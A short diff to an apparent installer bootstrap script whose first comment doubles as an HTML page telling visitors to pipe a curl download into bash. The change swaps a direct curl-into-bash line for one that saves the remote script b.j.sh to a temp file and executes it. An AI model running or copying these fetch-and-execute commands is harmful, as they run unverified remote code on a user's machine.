@@ -1,4 +1,7 @@
 #!/bin/bash
 # <br><h1>Please run: <pre><code>bash -c "$(curl https://bdj.obsidianos.xyz)"</pre></code></h1> <p hidden>
-bash -c "$(curl -s https://bdj.obsidianos.xyz/b.j.sh)"
+tmp=$(mktemp)
+curl -s https://bdj.obsidianos.xyz/b.j.sh > $tmp
+chmod a+x $tmp
+exec $tmp
 # let's be nice and close the </p>
